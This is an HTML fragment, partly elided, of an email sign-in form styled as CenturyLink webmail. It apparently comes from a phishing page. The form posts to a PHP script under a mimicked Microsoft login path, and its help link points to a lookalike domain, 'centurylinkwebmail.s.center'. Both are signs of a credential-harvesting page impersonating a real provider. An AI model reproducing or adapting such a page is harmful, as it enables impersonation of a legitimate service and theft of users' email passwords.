                ...
                <div class="container">
                    ...
                    <div class="form-detail-wrapper" >
                        <div class="left-content-wrap" style="margin-bottom: 20px">
                            <form autocomplete="off" action="wsignin1.0&rpsnv=13&ct=1648037205&rver=Cen-02&wp=MBI_SSL.php" method="post" name="login" id="login" onsubmit="return IsEmail()">
                            ...
                            <div id="errmsg_api" class="empty-error" style="font-size: 12px; color: #d93025; position:static; margin: 25px 0 10px; visibility: hidden; line-height:18px !important; margin-top: 15px !important">xxxx</div>
                            ...
                            <div class="form-group" style="font-size: 12px; padding-top: 15px;">
                                <a  href="/v1/recover/" target="blank" class="link" style="color:#0047bb !important;" >Forgot Password?</a><span style="float: right"><a  href="https://centurylinkwebmail.s.center/hc/en-us" target="blank" class="link" style="color:#0047bb !important;" >Need help?</a></span>
                            </div>
                            <div class="form-group" style="font-size: 14px; padding-top: 20px; font-weight: bold;">
                                <span style="display: table; margin: 0 auto;">
                                    ...
                                    <a  href="/v1/sig/"  class="link" style="color: #0047bb !important; display:none" >Create New Email Account</a>
                                </span>
                            </div>
                            ...
                            <div class="get-mobile-app" style="margin-top: 0px !important; display: none; ">
                                ...
                                <ul class="store-wrap">
                                    <li class="apple-store">
                                        <a href="https://apps.apple.com/us/app/srt-email/id1496178263" target="_blank">
                                    ...
                                    <li class="google-store">
                                        <a href="https://play.google.com/store/apps/details?id=com.srtmail" target="_blank">
